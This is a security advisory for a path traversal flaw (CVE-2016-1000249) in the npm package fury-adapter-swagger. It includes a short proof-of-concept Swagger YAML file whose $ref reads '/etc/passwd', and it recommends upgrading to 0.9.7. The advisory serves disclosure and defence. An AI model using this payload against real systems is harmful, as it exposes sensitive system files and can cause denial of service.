# [H] fury-adapter-swagger allows arbitrary file read from system

## Summary
Severity: High
Advisory: GHSA-2r7f-4h2c-5x73
CVE: CVE-2016-1000249
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2020-09-01
Source: https://github.com/advisories/GHSA-2r7f-4h2c-5x73
Type: github-advisory

## Affected
- npm: `fury-adapter-swagger` — affected >=0.2.0 <0.9.7

## Details
`fury-adapter-swagger` from version 0.2.0 until version 0.9.7 has a weakness that allows an attacker to read arbitrary files off of the system. This can be used to read sensitive data, or to cause a denial of service condition by attempting to read something like `/dev/zero`.

## Proof of Concept:

```yaml
---
swagger: '2.0'
info:
  title: Read local files
  version: '1.0'

paths:
  /foo:
    get:
      responses:
        200:
          description: Some description
          examples:
            text/html:
              example:
                $ref: '/etc/passwd'
```


## Recommendation

Upgrade to version 0.9.7 or later.

## References
- https://github.com/apiaryio/fury-adapter-swagger/pull/89
- https://github.com/apiaryio/fury-adapter-swagger/commit/777e2d68f03546a88f3203bbd4725df8b1f662a7
- https://github.com/apiaryio/fury-adapter-swagger/commit/f4407e3a5323bc31123d45dbc93b8417002e4d51#diff-54c345dc104dc19440f9c2482b7883df820e8b9b699fdd8fa07e2773e7197a29
- https://github.com/apiaryio/fury-adapter-swagger
- https://security.snyk.io/vuln/npm:fury-adapter-swagger:20161024
- https://www.npmjs.com/advisories/305
